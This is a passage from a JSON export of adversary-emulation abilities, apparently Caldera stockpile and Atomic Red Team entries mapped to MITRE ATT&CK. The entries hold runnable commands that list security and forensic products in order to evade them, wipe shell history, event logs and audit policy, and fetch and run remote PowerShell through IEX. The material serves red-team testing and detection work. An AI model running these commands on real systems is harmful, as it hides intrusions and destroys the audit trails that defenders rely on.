recognizer\",\n    \"fses\",\n    \"fsfw\",\n    \"fsdfw\",\n    \"fsms\",\n    \"fsdevcon\"\n);\n\n$currentServices = Get-Service | Select-Object -Property Name;\nforeach ($svc in $currentServices) {\n    foreach ($secSvc in $securityServices) {\n        if ($svc.Name -like $secSvc) {\n            $svcDetails = Get-Service -name $svc.Name | Select-Object -Property Name, DisplayName, Status;\n            Write-Host \"[!] Security service found:\";\n            Write-Host \"    Service Name:`t\", $svcDetails.Name;\n            Write-Host \"    Display Name:`t\", $svcDetails.DisplayName;\n            Write-Host \"    Status:`t`t\", $svcDetails.Status;\n            Write-Host \"\";\n        }\n    }\n}", "language": null, "name": "psh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$securityServices = @(\n    \"msmpeng\",\n    \"windefend\",\n    \"mssense\",\n    \"sense\",\n    \"microsoft.tri.sensor\",\n    \"microsoft.tri.sensor.updater\",\n    \"cavp\",\n    \"cb\",\n    \"carbonblack\",\n    \"carbonblackk\",\n    \"cbcomms\",\n    \"cbstream\",\n    \"csfalconservice\",\n    \"csfalconcontainer\",\n    \"csagent\",\n    \"csdevicecontrol\",\n    \"csfalconservice\",\n    \"xagt\",\n    \"xagtnotif\",\n    \"fe_avk\",\n    \"fekern\",\n    \"feelam\",\n    \"fewscservice\",\n    \"ekrn\",\n    \"eguiproxy\",\n    \"egui\",\n    \"eamonm\",\n    \"eelam\",\n    \"ehdrv\",\n    \"ekrnepfw\",\n    \"epfwwfp\",\n    \"ekbdflt\",\n    \"epfw\",\n    \"fsgk32st\",\n    \"fswebuid\",\n    \"fsgk32\",\n    \"fsma32\",\n    \"fssm32\",\n    \"fnrb32\",\n    \"fsaua\",\n    \"fsorsp\",\n    \"fsav32\",\n    \"f-secure gatekeeper handler starter\",\n    \"f-secure network request broker\",\n    \"f-secure webui daemon\",\n    \"fsma\",\n    \"fsorspclient\",\n    \"f-secure gatekeeper\",\n    \"f-secure hips\",\n    \"fsbts\",\n    \"fsni\",\n    \"fsvista\",\n    \"f-secure filter\",\n    \"f-secure recognizer\",\n    \"fses\",\n    \"fsfw\",\n    \"fsdfw\",\n    \"fsms\",\n    \"fsdevcon\"\n);\n\n$currentServices = Get-Service | Select-Object -Property Name;\nforeach ($svc in $currentServices) {\n    foreach ($secSvc in $securityServices) {\n        if ($svc.Name -like $secSvc) {\n            $svcDetails = Get-Service -name $svc.Name | Select-Object -Property Name, DisplayName, Status;\n            Write-Host \"[!] Security service found:\";\n            Write-Host \"    Service Name:`t\", $svcDetails.Name;\n            Write-Host \"    Display Name:`t\", $svcDetails.DisplayName;\n            Write-Host \"    Status:`t`t\", $svcDetails.Status;\n            Write-Host \"\";\n        }\n    }\n}", "language": null, "name": "pwsh", "variations": [], "uploads": []}], "technique_name": "Virtualization/Sandbox Evasion: System Checks", "ability_id": "1258b063-27d6-489b-a677-4807faacf868", "technique_id": "T1497.001", "tactic": "defense-evasion", "requirements": [], "name": "Check Security Services", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Check for analysis/sandbox environment processes. Process black list is based on the SUNBURST malware observed in a Solarwinds related compromise (https://research.checkpoint.com/2020/sunburst-teardrop-and-the-netsec-new-normal/).", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$forensicProcesses = @(\n    \"apimonitor-x64\",\n    \"apimonitor-x86\",\n    \"autopsy64\",\n    \"autopsy\",\n    \"autoruns64\",\n    \"autoruns\",\n    \"autorunsc64\",\n    \"autorunsc\",\n    \"binaryninja\",\n    \"blacklight\",\n    \"cff explorer\",\n    \"cutter\",\n    \"de4dot\",\n    \"debugview\",\n    \"diskmon\",\n    \"dnsd\",\n    \"dnspy\",\n    \"dotpeek32\",\n    \"dotpeek64\",\n    \"dumpcap\",\n    \"evidence center\",\n    \"exeinfope\",\n    \"fakedns\",\n    \"fakenet\",\n    \"ffdec\",\n    \"fiddler\",\n    \"fileinsight\",\n    \"floss\",\n    \"gdb\",\n    \"hiew32demo\",\n    \"hiew32\",\n    \"hollows_hunter\",\n    \"idaq64\",\n    \"idaq\",\n    \"idr\",\n    \"ildasm\",\n    \"ilspy\",\n    \"jd-gui\",\n    \"lordpe\",\n    \"officemalscanner\",\n    \"ollydbg\",\n    \"pdfstreamdumper\",\n    \"pe-bear\",\n    \"pebrowse64\",\n    \"peid\",\n    \"pe-sieve32\",\n    \"pe-sieve64\",\n    \"pestudio\",\n    \"peview\",\n    \"ppee\",\n    \"procdump64\",\n    \"procdump\",\n    \"processhacker\",\n    \"procexp64\",\n    \"procexp\",\n    \"procmon\",\n    \"prodiscoverbasic\",\n    \"py2exedecompiler\",\n    \"r2agent\",\n    \"rabin2\",\n    \"radare2\",\n    \"ramcapture64\",\n    \"ramcapture\",\n    \"reflector\",\n    \"regmon\",\n    \"resourcehacker\",\n    \"retdec-ar-extractor\",\n    \"retdec-bin2llvmir\",\n    \"retdec-bin2pat\",\n    \"retdec-config\",\n    \"retdec-fileinfo\",\n    \"retdec-getsig\",\n    \"retdec-idr2pat\",\n    \"retdec-llvmir2hll\",\n    \"retdec-macho-extractor\",\n    \"retdec-pat2yara\",\n    \"retdec-stacofin\",\n    \"retdec-unpacker\",\n    \"retdec-yarac\",\n    \"rundotnetdll\",\n    \"sbiesvc\",\n    \"scdbg\",\n    \"scylla_x64\",\n    \"scylla_x86\",\n    \"shellcode_launcher\",\n    \"solarwindsdiagnostics\",\n    \"sysmon64\",\n    \"sysmon\",\n    \"task explorer\",\n    \"task explorer-x64\",\n    \"tcpdump\",\n    \"tcpvcon\",\n    \"tcpview\",\n    \"vboxservice\",\n    \"win32_remote\",\n    \"win64_remotex64\",\n    \"windbg\",\n    \"windump\",\n    \"winhex64\",\n    \"winhex\",\n    \"winobj\",\n    \"wireshark\",\n    \"x32dbg\",\n    \"x64dbg\",\n    \"xwforensics64\",\n    \"xwforensics\",\n    \"redcloak\",\n    \"avgsvc\",\n    \"avgui\",\n    \"avgsvca\",\n    \"avgidsagent\",\n    \"avgsvcx\",\n    \"avgwdsvcx\",\n    \"avgadminclientservice\",\n    \"afwserv\",\n    \"avastui\",\n    \"avastsvc\",\n    \"aswidsagent\",\n    \"aswidsagenta\",\n    \"aswengsrv\",\n    \"avastavwrapper\",\n    \"bccavsvc\",\n    \"psanhost\",\n    \"psuaservice\",\n    \"psuamain\",\n    \"avp\",\n    \"avpui\",\n    \"ksde\",\n    \"ksdeui\",\n    \"tanium\",\n    \"taniumclient\",\n    \"taniumdetectengine\",\n    \"taniumendpointindex\",\n    \"taniumtracecli\",\n    \"taniumtracewebsocketclient64\"\n);\n\nfunction Find-ForensicProcesses {\n    param (\n        $ForensicProcessList\n    );\n    $CurrentProcesses = Get-Process | Sort-Object | Select-Object -Property Name | Get-Unique -AsString;\n    foreach ($proc in $CurrentProcesses) {\n        foreach ($forensicProc in $ForensicProcessList) {\n            if ($proc.name -like $forensicProc) {\n                $procPath = Get-Process -Name $proc.Name | Sort-Object | Select-Object -Property Path | Get-Unique;\n                Write-Host \"[!] Forensic process found: \" $proc.Name;\n                Write-Host \"[!] Path: \" $procPath.Path;\n            }\n        }\n    }\n}\n\nFind-ForensicProcesses($forensicProcesses);", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Virtualization/Sandbox Evasion: System Checks", "ability_id": "7a6ba833-de40-466a-8969-5c37b13603e0", "technique_id": "T1497.001", "tactic": "defense-evasion", "requirements": [], "name": "Check analysis environment processes", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes the CheckIfInstallable class constructor runner instead of executing InstallUtil. Upon execution, the InstallUtil test harness will be executed.\nIf no output is displayed the test executed successfuly.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["eaecbe_InstallUtilTestHarness.ps1"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["$InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "if (Test-Path \"eaecbe_InstallUtilTestHarness.ps1\") { ; } else {New-Item -Type Directory (split-path eaecbe_InstallUtilTestHarness.ps1) -ErrorAction ignore | Out-Null; Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"eaecbe_InstallUtilTestHarness.ps1\"};  ; . eaecbe_InstallUtilTestHarness.ps1; $InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; $ExpectedOutput = 'Constructor_'; $TestArgs = @{;     OutputAssemblyDirectory = $InstallerAssemblyDir;     OutputAssemblyFileName = $InstallerAssemblyFileName;     InvocationMethod = 'CheckIfInstallable'; }; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly; if ($ActualOutput -ne $ExpectedOutput) {;     throw @\"; CheckIfInstallable method execution test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput; \"@; }", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: InstallUtil", "ability_id": "c3a04ce292bc3f8615d56af548c8dec0", "technique_id": "T1218.004", "tactic": "defense-evasion", "requirements": [], "name": "CheckIfInstallable method call", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "chmods a file using a c script\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "/tmp/T1222002 /tmp/ T1222002", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "/tmp/T1222002 /tmp/ T1222002", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification", "ability_id": "2b403e3d0f5501a43b025c29b7c55d60", "technique_id": "T1222.002", "tactic": "defense-evasion", "requirements": [], "name": "Chmod through c script", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "chowns a file to root using a c script\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["2a24e8_chown.c"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sudo /tmp/T1222002own 2a24e8_chown.c", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": ["2a24e8_chown.c"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "sudo /tmp/T1222002own 2a24e8_chown.c", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification", "ability_id": "0503af9fd6d1fbc9ddc632c91e32d2de", "technique_id": "T1222.002", "tactic": "defense-evasion", "requirements": [], "name": "Chown through c script", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Clears bash history via cat /dev/null\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "cat /dev/null > ~/.bash_history", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "cat /dev/null > ~/.bash_history", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: Clear Command History", "ability_id": "a534890161825ac40b02e5f4c82cc5dd", "technique_id": "T1070.003", "tactic": "defense-evasion", "requirements": [], "name": "Clear Bash history (cat dev/null)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Clears bash history via rm\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "echo \"\" > ~/.bash_history", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: Clear Command History", "ability_id": "ee72a74844bbc0bcdff17b3ce7157b19", "technique_id": "T1070.003", "tactic": "defense-evasion", "requirements": [], "name": "Clear Bash history (echo)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Clears bash history via a symlink to /dev/null\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "ln -sf /dev/null ~/.bash_history", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "ln -sf /dev/null ~/.bash_history", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: Clear Command History", "ability_id": "6ee56fbf12b8fe3df6bb96aa4abcbe01", "technique_id": "T1070.003", "tactic": "defense-evasion", "requirements": [], "name": "Clear Bash history (ln dev/null)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Clears bash history via rm\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "rm ~/.bash_history", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "rm ~/.bash_history", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: Clear Command History", "ability_id": "0b3075a32ff077d5e0c8212ff796ec36", "technique_id": "T1070.003", "tactic": "defense-evasion", "requirements": [], "name": "Clear Bash history (rm)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Clears bash history via truncate\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "truncate -s0 ~/.bash_history", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: Clear Command History", "ability_id": "d8f4e4e10f4d6da1b174bb18cb859e6c", "technique_id": "T1070.003", "tactic": "defense-evasion", "requirements": [], "name": "Clear Bash history (truncate)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This module utilizes WMI via VBA to clear the Security and Backup eventlogs from the system. \n\nElevation is required for this module to execute properly, otherwise WINWORD will throw an \"Access Denied\" error\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); Invoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1070.001\\src\\T1070.001-macrocode.txt\" -officeProduct \"Word\" -sub \"ClearLogs\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: Clear Windows Event Logs", "ability_id": "05f8b752dbccff102ef530103bd8e550", "technique_id": "T1070.001", "tactic": "defense-evasion", "requirements": [], "name": "Clear Event Logs via VBA", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Clear Shell History. This technique only affect the bash shell application. \n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "history -c", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "132984234ad769f2b2a36e2b2e36c97f", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "Clear History", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Upon execution this test will clear Windows Event Logs. Open the System.evtx logs at C:\\Windows\\System32\\winevt\\Logs and verify that it is now empty.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "wevtutil cl System", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: Clear Windows Event Logs", "ability_id": "3838447b079b302fe75b700a70163815", "technique_id": "T1070.001", "tactic": "defense-evasion", "requirements": [], "name": "Clear Logs", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Clear Sysmon logs [intended to trigger CAR-2016-04-002]", "repeatable": false, "privilege": "Elevated", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Clear-Eventlog Security;\nClear-Eventlog System;", "language": null, "name": "psh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Clear-Eventlog Security;\nClear-Eventlog System;", "language": null, "name": "pwsh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: Clear Windows Event Logs", "ability_id": "fcf71ee3-d1a9-4136-b919-9e5f6da43608", "technique_id": "T1070.001", "tactic": "defense-evasion", "requirements": [], "name": "Clear Logs", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "clear pagging cache via system request. This is a temporary change in the system to clear paging cache. This technique seen in Awfulshred wiper as part\nof its malicious payload on the compromised host. added reference link for this technique: https://www.tecmint.com/clear-ram-memory-cache-buffer-and-swap-space-on-linux/\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "free && echo 3 > /proc/sys/vm/drop_caches && free; echo 3> /proc/sys/vm/drop_caches", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "2929fac2296bf1041ba33c86d42d9a5a", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "Clear Pagging Cache", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Clears Powershell history\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Remove-Item (Get-PSReadlineOption).HistorySavePath", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: Clear Command History", "ability_id": "adce11c81bb77ae74660c6c743a0442d", "technique_id": "T1070.003", "tactic": "defense-evasion", "requirements": [], "name": "Clear Powershell History by Deleting History File", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Clear the Windows audit policy using auditpol utility. This action would stop certain audit events from being recorded in the security log.", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["auditpol /set /category:\"Account Logon\" /success:enable /failure:enable && auditpol /set /category:\"Detailed Tracking\" /success:enable && auditpol /set /category:\"Logon/Logoff\" /success:enable /failure:enable"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "auditpol /clear /y && auditpol /remove /allusers", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable Windows Event Logging", "ability_id": "6a8d25d65a7d481dc479f89c62af1e6a", "technique_id": "T1562.002", "tactic": "defense-evasion", "requirements": [], "name": "Clear Windows Audit Policy Config", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Clears the history and disable bash history logging of the current shell and future shell sessions\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sed -i 's/set +o history//g' ~/.bashrc; . ~/.bashrc; set -o history"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "set +o history; echo 'set +o history' >> ~/.bashrc; . ~/.bashrc; history -c", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sed -i 's/set +o history//g' ~/.bashrc; . ~/.bashrc; set -o history"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "set +o history; echo 'set +o history' >> ~/.bashrc; . ~/.bashrc; history -c", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: Clear Command History", "ability_id": "64099c73cfd2e72b45bf167e755e414c", "technique_id": "T1070.003", "tactic": "defense-evasion", "requirements": [], "name": "Clear and Disable Bash History Logging", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An attacker may clear the bash history cache and the history file as their last act before logging off to remove the record of their command line activities. \n\nIn this test we use the $HISTFILE variable throughout to 1. confirms the $HISTFILE variable is set 2. echo \"\" into it 3..5 confirm the file is empty 6 clear the history cache 7. confirm the history cache is empty. This is when the attacker would logoff.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["mv -f $HISTFILE.OLD $HISTFILE"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "cp $HISTFILE $HISTFILE.OLD; if ((${#HISTFILE[@]})); then echo $HISTFILE; fi; echo \"\" > $HISTFILE; if [ $(wc -c <$HISTFILE) -gt 1 ]; then echo \"$HISTFILE is larger than 1k\"; fi; ls -la $HISTFILE ; cat $HISTFILE; history -c ; if [ $(history |wc -l) -eq 1 ]; then echo \"History cache cleared\"; fi", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: HISTCONTROL", "ability_id": "3f465c72d351789eda3a553334fa43f3", "technique_id": "T1562.003", "tactic": "defense-evasion", "requirements": [], "name": "Clear bash history", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Clears the history of a bunch of different shell types by setting the history size to zero\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "unset HISTFILE; export HISTFILESIZE=0; history -c", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "unset HISTFILE; export HISTFILESIZE=0; history -c", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: Clear Command History", "ability_id": "c9c5e0ffc0a02e309f7bdf4e2a3e5a65", "technique_id": "T1070.003", "tactic": "defense-evasion", "requirements": [], "name": "Clear history of a bunch of shells", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Uses the [Named Pipes Micro Emulation](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes) executable from the Center for Threat Informed Defense to create a named pipe for inter-process communication.\n\nThe named pipe executable will pause for 30 seconds to allow the client and server to exchange a message through the pipe.\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "\"PathToAtomicsFolder\\T1559\\bin\\build\\namedpipes_executor.exe\" --pipe 1", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Inter-Process Communication", "ability_id": "71e15fde52e9acd90c3d5a4c1826279d", "technique_id": "T1559", "tactic": "execution", "requirements": [], "name": "Cobalt Strike Artifact Kit pipe", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Uses the [Named Pipes Micro Emulation](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes) executable from the Center for Threat Informed Defense to create a named pipe for inter-process communication.\n\nThe named pipe executable will pause for 30 seconds to allow the client and server to exchange a message through the pipe.\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "\"PathToAtomicsFolder\\T1559\\bin\\build\\namedpipes_executor.exe\" --pipe 2", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Inter-Process Communication", "ability_id": "7c6a6ffb23e7949d5ce5b0b9dfcbd73f", "technique_id": "T1559", "tactic": "execution", "requirements": [], "name": "Cobalt Strike Lateral Movement (psexec_psh) pipe", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Uses the [Named Pipes Micro Emulation](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes) executable from the Center for Threat Informed Defense to create a named pipe for inter-process communication.\n\nThe named pipe executable will pause for 30 seconds to allow the client and server to exchange a message through the pipe.\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "\"PathToAtomicsFolder\\T1559\\bin\\build\\namedpipes_executor.exe\" --pipe 3", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Inter-Process Communication", "ability_id": "8afcc1dcfffe03846de54686dff957ab", "technique_id": "T1559", "tactic": "execution", "requirements": [], "name": "Cobalt Strike SSH (postex_ssh) pipe", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Uses the [Named Pipes Micro Emulation](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes) executable from the Center for Threat Informed Defense to create a named pipe for inter-process communication.\n\nThe named pipe executable will pause for 30 seconds to allow the client and server to exchange a message through the pipe.\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "\"PathToAtomicsFolder\\T1559\\bin\\build\\namedpipes_executor.exe\" --pipe 4", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Inter-Process Communication", "ability_id": "a3a4320ad140e1046b224082cccd3be9", "technique_id": "T1559", "tactic": "execution", "requirements": [], "name": "Cobalt Strike post-exploitation pipe (4.2 and later)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Uses the [Named Pipes Micro Emulation](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes) executable from the Center for Threat Informed Defense to create a named pipe for inter-process communication.\n\nThe named pipe executable will pause for 30 seconds to allow the client and server to exchange a message through the pipe.\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "\"PathToAtomicsFolder\\T1559\\bin\\build\\namedpipes_executor.exe\" --pipe 5", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Inter-Process Communication", "ability_id": "7471518905b120283ba2644c9519bee2", "technique_id": "T1559", "tactic": "execution", "requirements": [], "name": "Cobalt Strike post-exploitation pipe (before 4.2)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Locate all active IP and FQDNs on the network", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.ipaddr", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "remote.host.ip"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": 